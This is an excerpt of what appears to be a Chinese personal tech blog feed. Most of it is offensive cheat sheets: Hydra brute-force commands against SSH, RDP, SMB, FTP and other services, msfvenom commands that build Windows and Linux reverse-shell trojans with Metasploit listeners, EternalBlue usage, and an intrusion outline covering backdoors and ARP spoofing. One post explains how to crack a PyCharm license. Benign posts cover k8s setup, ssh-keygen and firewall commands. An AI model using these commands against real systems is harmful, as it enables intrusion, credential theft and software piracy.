    <content><![CDATA[<h2 id="参数详解"><a href="#参数详解" class="headerlink" title="参数详解"></a>参数详解</h2><pre><code>-l login 小写，指定用户名进行破解
-L file 大写，指定用户的用户名字典
-p pass 小写，用于指定密码破解，很少使用，一般采用密码字典
-P file 大写，用于指定密码字典
-s PORT 指定默认端口
-C使用冒号分割格式，例如“登录名:密码”来代替 -L/-P 参数
-e ns 额外的选项，n：空密码试探，s：使用指定账户和密码试探
-M file 指定目标ip列表文件，批量破解
-o file 指定结果输出文件
-f 找到第一对登录名或者密码的时候中止破解
-t tasks 同时运行的线程数，默认是16
-S大写，采用SSL链接
-w time 设置最大超时时间，单位
-v / -V 显示详细过程
-R 恢复爆破（如果破解中断了，下次执行 hydra -R /path/to/hydra.restore 就可以继续任务。）
-x 自定义密码
</code></pre>
<h2 id="爆破协议举例"><a href="#爆破协议举例" class="headerlink" title="爆破协议举例"></a>爆破协议举例</h2><p>SSH暴力破解</p>
<pre><code>hydra -L 用户名字典 -P 密码字典 -t -vV -o ssh.log -e ns IP ssh
</code></pre>
<p>mysql暴力破解</p>
<pre><code>hydra -L 用户名字典 -P 密码字典 -t 5 IP mysql
</code></pre>
<p>远程桌面暴力破解</p>
<pre><code>hydra -L 用户名字典 -P 密码字典 -t 1 IP rdp
</code></pre>
<p>使用hydra破解ssh的密码</p>
<pre><code>hydra -L 用户名字典 -P 密码字典 -o ssh.log -e ns IP ssh
</code></pre>
<p>破解https：</p>
<pre><code>hydra -m /index.php -l 用户名 -P 密码字典 IP https
</code></pre>
<p>破解teamspeak：</p>
<pre><code>hydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak
</code></pre>
<p>破解cisco：</p>
<pre><code>hydra -P 用户字典 IP cisco
hydra -m cloud -P 密码字典 IP cisco-enable
</code></pre>
<p>破解smb：</p>
<pre><code>hydra -l administrator -P 密码字典 IP smb
</code></pre>
<p>破解pop3：</p>
<pre><code>hydra -l (muts)用户名 -P 密码字典 my.pop3.mail pop3
</code></pre>
<p>破解rdp：</p>
<pre><code>hydra IP rdp -l administrator -P 密码字典 -V
</code></pre>
<p>破解http-proxy：</p>
<pre><code>hydra -l admin -P 密码字典 http-proxy://127.0.0.1
</code></pre>
<p>破解telnet</p>
<pre><code>hydra IP telnet -l 用户 -P 密码字典 -t 32 -s 23 -e ns -f -V
</code></pre>
<p>破解ftp：</p>
<pre><code>hydra IP ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV
</code></pre>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>kali</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>kali</tag>
        <tag>渗透命令</tag>
      </tags>
  </entry>
  <entry>
    <title>msfconsole命令</title>
    <url>/2024/08/01/msfconsole%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h2 id="攻击模块"><a href="#攻击模块" class="headerlink" title="攻击模块"></a>攻击模块</h2><p>软件更新</p>
<pre><code>apt update # 更新安装包信息；只检查，不更新
apt upgrade # 更新已安装的软件包，不删除旧包； 
apt full-upgrade # 升级包，删除旧包
</code></pre>
<p>基础使用</p>
<pre><code>msfconsole //进入框架
search  ms17_010 //使用search命令查找相关漏洞
use exploit/windows/smb/ms17_010_eternalblue //使用use进入模块
info //使用info查看模块信息
show options //查看参数
set  RHOST  192.168.100.158 //设置参数
exploit/run
</code></pre>
<p>辅助模块(auxiliary)</p>
<p>漏洞利用(exploit)</p>
<p>攻击载荷(payload)：<br>    Stager中几种常见的payload：<br>    windows&#x2F;meterpreter&#x2F;bind_tcp       &#x2F;&#x2F;正向连接<br>    windows&#x2F;meterpreter&#x2F;reverse_tcp    &#x2F;&#x2F;反向连接，常用<br>    windows&#x2F;meterpreter&#x2F;reverse_http   &#x2F;&#x2F;通过监听80端口反向连接<br>    windows&#x2F;meterpreter&#x2F;reverse_https  &#x2F;&#x2F;通过监听443端口反向连接</p>
<h2 id="木马"><a href="#木马" class="headerlink" title="木马"></a>木马</h2><p>windows木马<br>创建木马</p>
<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.110 LPORT=4444 -f exe -o 123.exe
</code></pre>
<p>开启kali监听</p>
<pre><code>启动msfconsole
开启监听
    use exploit/multi/handler
设置tcp监听
    set payload windows/meterpreter/reverse_tcp
设置本机ip和端口
    set
输入explore开始监听
</code></pre>
<p>运行木马后木马上线，进入meterpreter</p>
<p>后续同上，不做详细解释</p>
<p>linux elf木马反弹shell创建（msf6版本）</p>
<pre><code>    msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=8888 -f elf &gt; mshell.elf
</code></pre>
<p>监听</p>
<pre><code>msfconsole
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set lhost xxx.xxx.xxx.xxx
set lport 8888
run
</code></pre>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>kali</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>kali</tag>
        <tag>渗透命令</tag>
      </tags>
  </entry>
  <entry>
    <title>oppoA9 mtk手机root</title>
    <url>/2024/08/01/mtk%E6%89%8B%E6%9C%BAroot/</url>
    <content><![CDATA[<h2 id="mtk手机root"><a href="#mtk手机root" class="headerlink" title="mtk手机root"></a>mtk手机root</h2><p>通过mtkclient工具连接手机漏洞后，导出boot文件，修补后导回，完成root。</p>
<p>mkclient下载地址，可通过下方网友地址，或者github上获取：</p>
<pre><code>https://xinkid.lanzouv.com/b075nltgh 密:canxin
</code></pre>
<p>1、oppoA9为例，打开mtkclient工具，手机关机后按住音量+-键，插入数据线，等待软件连接<br>2、连接后通过读分区导出boot文件，不带后缀<br>3、手机开机安装magisk，通过面具修补boot文件，boot文件改回bin后缀</p>
<p><img src="/images/pasted-2.png" alt="upload successful"></p>
<p>4、同样通过第一步连接手机，刷入修补好的boot文件，重新启动发现无需按电源键即可开机，代表已成功root。</p>
<p><img src="/images/pasted-3.png" alt="upload successful"></p>
]]></content>
      <categories>
        <category>手机搞机</category>
      </categories>
      <tags>
        <tag>手机root</tag>
      </tags>
  </entry>
  <entry>
    <title>nmap命令</title>
    <url>/2024/08/01/nmap%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h2 id="常用命令总结"><a href="#常用命令总结" class="headerlink" title="常用命令总结"></a>常用命令总结</h2><p>命令格式</p>
<pre><code>nmap [参数] [ip]
</code></pre>
<p>主机探测（隐蔽扫描&#x2F;TCP ACK&#x2F;TCP SYN&#x2F;TCP空扫描欺骗防火墙）</p>
<pre><code>nmap -sS/-PS/-PA/-sN ip
</code></pre>
<p>命令表格</p>
<table>
<thead>
<tr>
<th align="center">命令</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">nmap IP</td>
<td align="center">扫描IP</td>
</tr>
<tr>
<td align="center">nmap -v IP</td>
<td align="center">加强扫描</td>
</tr>
<tr>
<td align="center">nmap IP1 IP2 …</td>
<td align="center">扫描多IP</td>
</tr>
<tr>
<td align="center">nmap a.b.c.*</td>
<td align="center">扫描整个子网</td>
</tr>
<tr>
<td align="center">nmap a.b.c.x,y,…</td>
<td align="center">扫描多子网地址</td>
</tr>
<tr>
<td align="center">nmap -iL xxx.txt</td>
<td align="center">根据文件扫描多IP</td>
</tr>
<tr>
<td align="center">nmap a.b.c.x-y</td>
<td align="center">扫描子网IP范围</td>
</tr>
<tr>
<td align="center">nmap a.b.c.* –exclude IP</td>
<td align="center">排除指定IP扫描整个子网</td>
</tr>
<tr>
<td align="center">nmap -A IP</td>
<td align="center">扫描操作系统和路由跟踪</td>
</tr>
<tr>
<td align="center">nmap -O IP</td>
<td align="center">探测操作系统</td>
</tr>
<tr>
<td align="center">nmap -sA&#x2F;-PN IP</td>
<td align="center">探测防火墙</td>
</tr>
<tr>
<td align="center">nmap -sP a.b.c.*</td>
<td align="center">探测在线主机</td>
</tr>
<tr>
<td align="center">nmap -F IP</td>
<td align="center">快速扫描</td>
</tr>
<tr>
<td align="center">nmap -r IP</td>
<td align="center">按顺序扫描</td>
</tr>
<tr>
<td align="center">nmap -iflist</td>
<td align="center">显示接口和路由信息</td>
</tr>
<tr>
<td align="center">nmap -p n1,n2… IP</td>
<td align="center">扫描指定端口</td>
</tr>
<tr>
<td align="center">nmap -p T:n1,n2… IP</td>
<td align="center">扫描TCP端口</td>
</tr>
<tr>
<td align="center">nmap -sU n1,n2… IP</td>
<td align="center">扫描UDP端口</td>
</tr>
<tr>
<td align="center">nmap -sV IP</td>
<td align="center">查看服务的版本</td>
</tr>
<tr>
<td align="center">nmap -PS IP</td>
<td align="center">TCP ACK扫描</td>
</tr>
<tr>
<td align="center">nmap -PA IP</td>
<td align="center">TCP SYN扫描</td>
</tr>
<tr>
<td align="center">nmap -sS IP</td>
<td align="center">隐蔽扫描</td>
</tr>
<tr>
<td align="center">nmap -sN IP</td>
<td align="center">TCP空扫描欺骗防火墙</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>kali</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>kali</tag>
        <tag>渗透命令</tag>
      </tags>
  </entry>
  <entry>
    <title>pycharm激活</title>
    <url>/2024/08/10/pycharm%E6%BF%80%E6%B4%BB/</url>
    <content><![CDATA[<h2 id="检查链接"><a href="#检查链接" class="headerlink" title="检查链接"></a>检查链接</h2><p>网址：<a href="https://3.jetbra.in/">https://3.jetbra.in/</a></p>
<p>带小地图和*的标志，我们点进去<br><img src="/images/pasted-27.png" alt="upload successful"></p>
<h2 id="下载工具软件"><a href="#下载工具软件" class="headerlink" title="下载工具软件"></a>下载工具软件</h2><p>下载图中jetbra.zip<br><img src="/images/pasted-28.png" alt="upload successful"></p>
<p>解压，打开文件，进入scripts，双击图中文件<br><img src="/images/pasted-30.png" alt="upload successful"></p>
<p>等待10~20秒，会出现一个弹窗done，一般这个时候重启pycharm就已经激活，没有激活可以继续下面步骤。<br><img src="/images/pasted-31.png" alt="upload successful"></p>
<h2 id="激活码激活"><a href="#激活码激活" class="headerlink" title="激活码激活"></a>激活码激活</h2><p>点击图中pycharm复制<br><img src="/images/pasted-32.png" alt="upload successful"></p>
<p>复制激活<br><img src="/images/pasted-34.png" alt="upload successful"></p>
<p><img src="/images/pasted-33.png" alt="upload successful"></p>
<h1 id="下载的工具软件不能删除，删除失效！！"><a href="#下载的工具软件不能删除，删除失效！！" class="headerlink" title="下载的工具软件不能删除，删除失效！！"></a>下载的工具软件不能删除，删除失效！！</h1>]]></content>
      <categories>
        <category>代码</category>
        <category>工具安装</category>
      </categories>
      <tags>
        <tag>工具安装</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>压缩包密码爆破</title>
    <url>/2024/08/10/%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/</url>
    <content><![CDATA[<h2 id="使用zip2john-hash值破解"><a href="#使用zip2john-hash值破解" class="headerlink" title="使用zip2john hash值破解"></a>使用zip2john hash值破解</h2><p>生成压缩包hash值</p>
<pre><code>zip2john filename.zip &gt; hash.txt
</code></pre>
<p>开始破解</p>
<pre><code>john hash.txt
</code></pre>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>kali</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title>安全-内网渗透</title>
    <url>/2024/08/01/%E5%AE%89%E5%85%A8-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>主机存活<br>    ettercap -G 蜘蛛<br>    nmap<br>    nmap -sS 网段</p>
<p>漏洞搜集<br>    awvs			网站扫描<br>    gvm(openvas)	系统扫描<br>    nmap<br>    nmap –script&#x3D;vuln &#x2F;&#x2F;常见漏洞<br>    nmap –script-default &#x2F;&#x2F;默认收集信息脚本</p>
<h2 id="进入目标后"><a href="#进入目标后" class="headerlink" title="进入目标后"></a>进入目标后</h2><p>提权<br>    创建高权限用户<br>        windows<br>            net use<br>        linux<br>            user add</p>
<p>留后门<br>    创建木马<br>        木马(msfconsole)<br>    上传木马<br>        meterpreter<br>            upload</p>
<h2 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><p>改变流量走向<br>    ettercap(arp欺骗、dns劫持等)<br>    arpspoof<br>    arpspoof -i 网卡名称 -t 目标IP 网关</p>
<p>爆破密码<br>    hydra（九头蛇）<br>    msfconsole（爆破密码模块）</p>
<p>漏洞攻击<br>    msfconsole（漏洞攻击目录）</p>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>kali</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>生成密钥 ssh-keygen命令</title>
    <url>/2024/08/13/%E7%94%9F%E6%88%90%E5%AF%86%E9%92%A5-ssh-keygen%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h3 id="生成一个密钥文件"><a href="#生成一个密钥文件" class="headerlink" title="生成一个密钥文件"></a>生成一个密钥文件</h3><p>   生成一个 2048 位的 RSA 密钥对，并将私钥存储在 ~&#x2F;.ssh&#x2F;id_rsa 中，将公钥存储在 ~&#x2F;.ssh&#x2F;id_rsa.pub 中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -b 2048 -f ~/.ssh/id_rsa</span><br></pre></td></tr></table></figure>
<h3 id="示例详解"><a href="#示例详解" class="headerlink" title="示例详解"></a>示例详解</h3><p>-t rsa: 指定要生成的密钥类型为 RSA。RSA 是一种非对称加密算法，常用于生成 SSH 密钥对。</p>
<p>-b 2048: 指定生成的密钥的比特数。在这里，生成的密钥将有 2048 位。密钥位数越大，通常越安全，但也会增加计算负担。</p>
<p>-f ~&#x2F;.ssh&#x2F;id_rsa: 指定生成的密钥文件的路径。在这里，生成的私钥将存储在 ~&#x2F;.ssh&#x2F;id_rsa 文件中，而公钥则存储在 ~&#x2F;.ssh&#x2F;id_rsa.pub 文件中。这是默认的文件路径，可以根据需要指定其他路径。</p>
<h2 id="参数表格"><a href="#参数表格" class="headerlink" title="参数表格"></a>参数表格</h2><table>
<thead>
<tr>
<th align="center">参数</th>
<th align="left">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center">-b</td>
<td align="left">指定密钥长度；</td>
</tr>
<tr>
<td align="center">-e</td>
<td align="left">读取openssh的私钥或者公钥文件；</td>
</tr>
<tr>
<td align="center">-C</td>
<td align="left">添加注释；</td>
</tr>
<tr>
<td align="center">-f</td>
<td align="left">指定用来保存密钥的文件名；</td>
</tr>
<tr>
<td align="center">-i</td>
<td align="left">读取未加密的ssh-v2兼容的私钥&#x2F;公钥文件，然后在标准输出设备上显示openssh兼容的私钥&#x2F;公钥；</td>
</tr>
<tr>
<td align="center">-l</td>
<td align="left">显示公钥文件的指纹数据；</td>
</tr>
<tr>
<td align="center">-N</td>
<td align="left">提供一个新密语；</td>
</tr>
<tr>
<td align="center">-P</td>
<td align="left">提供（旧）密语；</td>
</tr>
<tr>
<td align="center">-q</td>
<td align="left">静默模式；</td>
</tr>
<tr>
<td align="center">-t</td>
<td align="left">指定要创建的密钥类型。</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>系统运维</category>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title>简单部署k8s</title>
    <url>/2024/08/15/%E7%AE%80%E5%8D%95%E9%83%A8%E7%BD%B2k8s/</url>
    <content><![CDATA[<h2 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h2><h3 id="服务器规划："><a href="#服务器规划：" class="headerlink" title="服务器规划："></a>服务器规划：</h3><table>
<thead>
<tr>
<th align="center">角色</th>
<th align="center">IP地址</th>
</tr>
</thead>
<tbody><tr>
<td align="center">k8s-master</td>
<td align="center">192.168.11.130</td>
</tr>
<tr>
<td align="center">k8s-node1</td>
<td align="center">192.168.11.134</td>
</tr>
<tr>
<td align="center">k8s-node2</td>
<td align="center">192.168.11.135</td>
</tr>
</tbody></table>
<h3 id="服务器要求："><a href="#服务器要求：" class="headerlink" title="服务器要求："></a>服务器要求：</h3><p>建议最小硬件配置：2核CPU、2G内存、20G硬盘。<br>服务器可以访问互联网，会联网下载镜像。<br>软件环境：</p>
<table>
<thead>
<tr>
<th align="center">软件</th>
<th align="center">版本</th>
</tr>
</thead>
<tbody><tr>
<td align="center">操作系统</td>
<td align="center">CentOS7.9_x64</td>
</tr>
<tr>
<td align="center">Docker</td>
<td align="center">24.0.0（CE）</td>
</tr>
<tr>
<td align="center">Kubernetes</td>
<td align="center">1.28</td>
</tr>
</tbody></table>
<h2 id="初始化配置"><a href="#初始化配置" class="headerlink" title="初始化配置"></a>初始化配置</h2><h3 id="关闭-Selinux"><a href="#关闭-Selinux" class="headerlink" title="关闭 Selinux"></a>关闭 Selinux</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sed -i &#x27;s/enforcing/disabled/&#x27; /etc/selinux/config # 永久</span><br><span class="line">setenforce 0 # 临时</span><br></pre></td></tr></table></figure>
<h3 id="关闭-Swap"><a href="#关闭-Swap" class="headerlink" title="关闭 Swap"></a>关闭 Swap</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">swapoff -a # 临时</span><br><span class="line">sed -ri &#x27;s/.*swap.*/#&amp;/&#x27; /etc/fstab # 永久</span><br></pre></td></tr></table></figure>
<h3 id="设置主机名"><a href="#设置主机名" class="headerlink" title="设置主机名"></a>设置主机名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hostnamectl set-hostname k8s-master</span><br></pre></td></tr></table></figure>
<h3 id="确保网络桥接的数据包经过-Iptables-处理，启用相关的内核参数"><a href="#确保网络桥接的数据包经过-Iptables-处理，启用相关的内核参数" class="headerlink" title="确保网络桥接的数据包经过 Iptables 处理，启用相关的内核参数"></a>确保网络桥接的数据包经过 Iptables 处理，启用相关的内核参数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat &gt; /etc/sysctl.d/k8s.conf &lt;&lt; EOF</span><br><span class="line">net.bridge.bridge-nf-call-ip6tables = 1</span><br><span class="line">net.bridge.bridge-nf-call-iptables = 1</span><br><span class="line">EOF</span><br><span class="line">sysctl --system # 生效</span><br></pre></td></tr></table></figure>
<h2 id="安装-Docker"><a href="#安装-Docker" class="headerlink" title="安装 Docker"></a>安装 Docker</h2><h3 id="下载安装"><a href="#下载安装" class="headerlink" title="下载安装"></a>下载安装</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo -O /etc/yum.repos.d/docker-ce.repo</span><br><span class="line">yum -y install docker-ce</span><br><span class="line">systemctl enable docker &amp;&amp; systemctl start docker</span><br></pre></td></tr></table></figure>
<h3 id="配置镜像下载加速器和设置-Cgroup-驱动"><a href="#配置镜像下载加速器和设置-Cgroup-驱动" class="headerlink" title="配置镜像下载加速器和设置 Cgroup 驱动"></a>配置镜像下载加速器和设置 Cgroup 驱动</h3><p>这一步可以参考最新的docker可用镜像源设置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat &gt; /etc/docker/daemon.json &lt;&lt; EOF</span><br><span class="line"> &#123;</span><br><span class="line"> &quot;registry-mirrors&quot;: [&quot;https://b9pmyelo.mirror.aliyuncs.com&quot;],</span><br><span class="line"> &quot;exec-opts&quot;: [&quot;native.cgroupdriver=systemd&quot;]</span><br><span class="line"> &#125;</span><br><span class="line">EOF</span><br><span class="line">systemctl restart docker</span><br><span class="line">docker info</span><br></pre></td></tr></table></figure>
<h3 id="安装-cri-dockerd（Docker-与-Kubernetes-通信的中间程序）"><a href="#安装-cri-dockerd（Docker-与-Kubernetes-通信的中间程序）" class="headerlink" title="安装 cri-dockerd（Docker 与 Kubernetes 通信的中间程序）"></a>安装 cri-dockerd（Docker 与 Kubernetes 通信的中间程序）</h3><p>测试最新版本0.3.15安装在centos7.9缺少依赖，但是显示的依赖包已安装，安装旧一版本0.3.14没什么问题，可能版本和我最简的centos7.9有些问题，下载地址为：<br><a href="https://github.com/Mirantis/cri-dockerd/releases">https://github.com/Mirantis/cri-dockerd/releases</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://github.com/Mirantis/cri-dockerd/releases/download/v0.3.14/cri-dockerd-0.3.14-3.el7.x86_64.rpm</span><br><span class="line">rpm -ivh cri-dockerd-0.3.2-3.el7.x86_64.rpm</span><br></pre></td></tr></table></figure>
<h3 id="指定依赖镜像地址为国内镜像地址："><a href="#指定依赖镜像地址为国内镜像地址：" class="headerlink" title="指定依赖镜像地址为国内镜像地址："></a>指定依赖镜像地址为国内镜像地址：</h3><p>修改ExecStart&#x3D;&#x2F;usr&#x2F;bin&#x2F;cri-dockerd –container-runtime-endpoint fd:&#x2F;&#x2F;部分，添加以下参数：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi /usr/lib/systemd/system/cri-docker.service</span><br><span class="line">ExecStart=/usr/bin/cri-dockerd --container-runtime-endpoint fd:// --pod-infra-container-image=registry.aliyuncs.com/google_containers/pause:3.9</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl enable cri-docker &amp;&amp; systemctl start cri-docker</span><br></pre></td></tr></table></figure>
<h2 id="部署-Kubernetes-集群"><a href="#部署-Kubernetes-集群" class="headerlink" title="部署 Kubernetes 集群"></a>部署 Kubernetes 集群</h2><h3 id="添加阿里云-YUM-软件源"><a href="#添加阿里云-YUM-软件源" class="headerlink" title="添加阿里云 YUM 软件源"></a>添加阿里云 YUM 软件源</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat &gt; /etc/yum.repos.d/kubernetes.repo &lt;&lt; EOF</span><br><span class="line">[kubernetes]</span><br><span class="line">name=Kubernetes</span><br><span class="line">baseurl=https://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64</span><br><span class="line">enabled=1</span><br><span class="line">gpgcheck=0</span><br><span class="line">repo_gpgcheck=0</span><br><span class="line">gpgkey=https://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg https://mirrors.ali</span><br><span class="line">yun.com/kubernetes/yum/doc/rpm-package-key.gpg</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>
<h3 id="安装-kubeadm，kubelet-和-kubectl"><a href="#安装-kubeadm，kubelet-和-kubectl" class="headerlink" title="安装 kubeadm，kubelet 和 kubectl"></a>安装 kubeadm，kubelet 和 kubectl</h3><p>我一般默认安装最新版yum install -y kubelet kubeadm kubectl，这里我指定下版本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install -y kubelet-1.28.2 kubeadm-1.28.2 kubectl-1.28.2</span><br><span class="line">systemctl enable kubelet</span><br></pre></td></tr></table></figure>
<h3 id="初始化-Master-节点"><a href="#初始化-Master-节点" class="headerlink" title="初始化 Master 节点"></a>初始化 Master 节点</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubeadm init \</span><br><span class="line">--apiserver-advertise-address=192.168.11.128 \</span><br><span class="line">--image-repository registry.aliyuncs.com/google_containers \</span><br><span class="line">--kubernetes-version v1.28.2 \</span><br><span class="line">--service-cidr=10.96.0.0/12 \</span><br><span class="line">--pod-network-cidr=10.244.0.0/16 \</span><br><span class="line">--cri-socket=unix:///var/run/cri-dockerd.sock</span><br></pre></td></tr></table></figure>
<p>初始化完成后，根据提示信息，拷贝 kubectl 工具认证文件到默认路径：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir -p $HOME/.kube</span><br><span class="line">sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config</span><br><span class="line">sudo chown $(id -u):$(id -g) $HOME/.kube/config</span><br></pre></td></tr></table></figure>
<p>使用 kubectl 工具查看节点状态：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl get nodes</span><br></pre></td></tr></table></figure>
<p>ps:由于网络插件还没有部署，节点会处于“NotReady”状态</p>
<h3 id="将-Node-节点加入集群"><a href="#将-Node-节点加入集群" class="headerlink" title="将 Node 节点加入集群"></a>将 Node 节点加入集群</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubeadm join 192.168.11.130:6443 --token pt332w.pz2sldn46h9ynfsw         --discovery-token-ca-cert-hash sha256:b6bdbc14bee762e5a7cfc24aa60cc842077180ae6595eb68b09d0333243cfa0c --cri-socket=unix:///var/run/cri-dockerd.sock</span><br></pre></td></tr></table></figure>
<h3 id="安装网络组件"><a href="#安装网络组件" class="headerlink" title="安装网络组件"></a>安装网络组件</h3><p>Pod 网络:Kubernetes 需要一个 Pod 网络插件来管理集群中的网络通信。你可以选择一个适合你环境的网络插件（如 Flannel、Calico、Weave 等），并使用 kubectl 命令来部署。</p>
<p>这里使用 Calico 作为 Kubernetes 的网络插件，负责集群中网络通信。<br>创建 Calico 网络组件的资源：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl apply -f https://docs.projectcalico.org/manifests/calico.yaml</span><br></pre></td></tr></table></figure>
<p>配置安全策略</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim network-policy.yaml</span><br><span class="line"></span><br><span class="line">apiVersion: networking.k8s.io/v1</span><br><span class="line">kind: NetworkPolicy</span><br><span class="line">metadata:</span><br><span class="line">  name: allow-all</span><br><span class="line">  namespace: default</span><br><span class="line">spec:</span><br><span class="line">  podSelector: &#123;&#125;</span><br><span class="line">  policyTypes:</span><br><span class="line">  - Ingress</span><br><span class="line">  - Egress</span><br><span class="line">  ingress:</span><br><span class="line">  - &#123;&#125;</span><br><span class="line">  egress:</span><br><span class="line">  - &#123;&#125;</span><br><span class="line"></span><br><span class="line">kubectl apply -f network-policy.yaml</span><br></pre></td></tr></table></figure>

<p>应用完成后，等待 5 分钟后，查看 Pod 运行状态：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl get pods -n kube-system</span><br></pre></td></tr></table></figure>
<p>如果出现问题，可能是还未下载完，也可以查看日志排查</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl logs -n kube-system &lt;pod-name&gt;</span><br></pre></td></tr></table></figure>
<p>ps：如果 Pod 处于“ContainerCreating”状态说明在下载镜像中，需耐心等待</p>
<h2 id="安装-Dashboard"><a href="#安装-Dashboard" class="headerlink" title="安装 Dashboard"></a>安装 Dashboard</h2><p>Dashboard 是官方提供的一个 UI，可用于基本管理 K8s 资源。</p>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl apply -f kubernetes-dashboard.yaml</span><br><span class="line">kubectl get pods -n kubernetes-dashboard</span><br></pre></td></tr></table></figure>
<p>浏览器访问“https:&#x2F;&#x2F;&lt;节点 IP 地址&gt;:30001”，将看到 Dashboard 登录界面。</p>
<h3 id="创建服务账号并授权管理员权限："><a href="#创建服务账号并授权管理员权限：" class="headerlink" title="创建服务账号并授权管理员权限："></a>创建服务账号并授权管理员权限：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 创建用户</span><br><span class="line">kubectl create serviceaccount dashboard-admin -n kubernetes-dashboard</span><br><span class="line"># 用户授权</span><br><span class="line">kubectl create clusterrolebinding dashboard-admin --clusterrole=cluster-admin --</span><br><span class="line">serviceaccount=kubernetes-dashboard:dashboard-admin</span><br><span class="line"># 获取用户 Token</span><br><span class="line">kubectl create token dashboard-admin -n kubernetes-dashboard</span><br></pre></td></tr></table></figure>

<p>使用输出的 Token 登录 Dashboard，将进入到首页<br>至此，k8s部署完成</p>
]]></content>
      <categories>
        <category>系统运维</category>
        <category>k8s</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>k8s</tag>
      </tags>
  </entry>
  <entry>
    <title>防火墙firewall和iptables命令</title>
    <url>/2024/08/11/%E9%98%B2%E7%81%AB%E5%A2%99firewall%E5%92%8Ciptables%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h2 id="firewall"><a href="#firewall" class="headerlink" title="firewall"></a>firewall</h2><h3 id="防火墙管理操作"><a href="#防火墙管理操作" class="headerlink" title="防火墙管理操作"></a>防火墙管理操作</h3><table>
<thead>
<tr>
<th align="center">命令功能</th>
<th align="left">命令</th>
</tr>
</thead>
<tbody><tr>
<td align="center">启动 firewalld.service服务</td>
<td align="left">service firewalld start</td>
</tr>
<tr>
<td align="center">停止firewalld.service服务</td>
<td align="left">service firewalld stop</td>
</tr>
<tr>
<td align="center">重启firewalld.service服务</td>
<td align="left">service firewalld restart</td>
</tr>
<tr>
<td align="center">查看firewall的状态</td>
<td align="left">firewall-cmd –state</td>
</tr>
<tr>
<td align="center">查看防火墙已有规则列表</td>
<td align="left">firewall-cmd –list-all</td>
</tr>
<tr>
<td align="center">查看firewall服务状态</td>
<td align="left">systemctl status firewalld</td>
</tr>
</tbody></table>
<p>原文链接：<a href="https://blog.csdn.net/ababab12345/article/details/121989807">https://blog.csdn.net/ababab12345/article/details/121989807</a></p>
<h3 id="开放端口"><a href="#开放端口" class="headerlink" title="开放端口"></a>开放端口</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">firewall-cmd --permanent --add-port=80/tcp</span><br></pre></td></tr></table></figure>
